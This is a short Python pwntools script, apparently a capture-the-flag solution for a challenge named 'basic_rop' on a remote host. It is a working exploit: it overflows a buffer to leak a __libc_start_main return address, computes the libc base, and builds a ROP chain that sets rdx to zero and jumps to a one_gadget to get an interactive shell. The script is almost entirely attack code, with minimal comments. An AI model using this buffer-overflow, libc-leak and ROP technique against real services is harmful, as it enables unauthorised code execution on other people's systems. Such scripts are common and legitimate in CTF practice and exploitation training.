from pwn import *

context.log_level = 'debug'

p = remote("pwn.isangxcaution.xyz", 10030)
e = ELF("./basic_rop")
libc = ELF("./libc-2.31.so")


def slog(symbol, addr): return success(symbol + ": " + hex(addr))


p.recvuntil("Attack Me :")

payload = b"A"*0x40  # fill buf
payload += b"B"*0x8  # fill buf
# payload += b"C"*0x8  # fill buf

p.send(payload)
p.recvuntil(payload)

# leak libc base
libc_start_243 = u64(p.recvn(8))
libc_start_main = libc_start_243 - 243
libc_start_main_offset = libc.symbols["__libc_start_main"]
libc_base = libc_start_main - libc_start_main_offset

slog("libc_start_243 :", libc_start_243)
slog("libc_start_main :", libc_start_main)
slog("libc_start_main_offset:", libc_start_main_offset)
slog("libc_base :", libc_base)

og = 0xe3b01
og_addr = libc_base + og

pop_rdx = 0x0142c92
pop_rdx_addr = libc_base + pop_rdx

slog("onegadget_offset :", og)
slog("onegadget_addr :", og_addr)

p.recvuntil("Again :")

payload = b"A"*0x40  # fill buf
payload += b"B"*0x8  # fill buf
payload += p64(pop_rdx_addr)
payload += p64(0)
payload += p64(og_addr)

p.send(payload)
p.interactive()
